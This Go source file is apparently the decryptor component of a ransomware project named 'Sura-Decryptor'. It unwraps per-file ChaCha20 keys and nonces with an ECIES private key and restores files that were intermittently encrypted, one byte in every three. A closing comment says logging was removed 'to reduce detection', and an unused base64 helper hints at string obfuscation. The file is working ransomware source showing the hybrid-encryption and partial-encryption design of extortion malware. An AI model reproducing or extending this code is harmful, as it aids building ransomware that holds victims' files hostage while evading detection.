package decryption

import (
	Configuration "Sura-Decryptor/configuration"
	"encoding/base64"
	"io"
	"os"
	"strings"

	eciesgo "github.com/ecies/go"
	"golang.org/x/crypto/chacha20"
)

const (
	separator = "||" // Separator between encrypted key/nonce and file content
)

var (
	privateKey *eciesgo.PrivateKey
	err        error
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

func init() {
	privateKey, err = eciesgo.NewPrivateKeyFromHex(Configuration.PrivateKey)
	if err != nil {
		panic(err)
	}
}

func DecryptFile(filePath string) {
	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return
	}
	defer file.Close()

	fileContent, err := io.ReadAll(file)
	if err != nil {
		return
	}

	// Split the file content to get the encrypted key, nonce, and ciphertext
	parts := strings.SplitN(string(fileContent), separator, 3)
	if len(parts) < 3 {
		return
	}

	encryptedKey := parts[0]
	encryptedNonce := parts[1]
	ciphertext := []byte(parts[2])

	// Decrypt the key and nonce using the private key
	key, err := eciesgo.Decrypt(privateKey, []byte(encryptedKey))
	if err != nil {
		return
	}

	nonce, err := eciesgo.Decrypt(privateKey, []byte(encryptedNonce))
	if err != nil {
		return
	}

	// Create the cipher for ChaCha20 decryption
	cipher, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return
	}

	plaintext := make([]byte, len(ciphertext))
	for i := 0; i < len(ciphertext); i += 3 {
		if i < len(ciphertext) {
			cipher.XORKeyStream(plaintext[i:i+1], ciphertext[i:i+1])
		}
		if i+1 < len(ciphertext) {
			plaintext[i+1] = ciphertext[i+1]
		}
		if i+2 < len(ciphertext) {
			plaintext[i+2] = ciphertext[i+2]
		}
	}

	// Write the decrypted data back to the file
	if err = file.Truncate(0); err != nil {
		return
	}

	if _, err = file.Seek(0, io.SeekStart); err != nil {
		return
	}

	if _, err = file.Write(plaintext); err != nil {
		return
	}

	// Removed logging to reduce detection
}
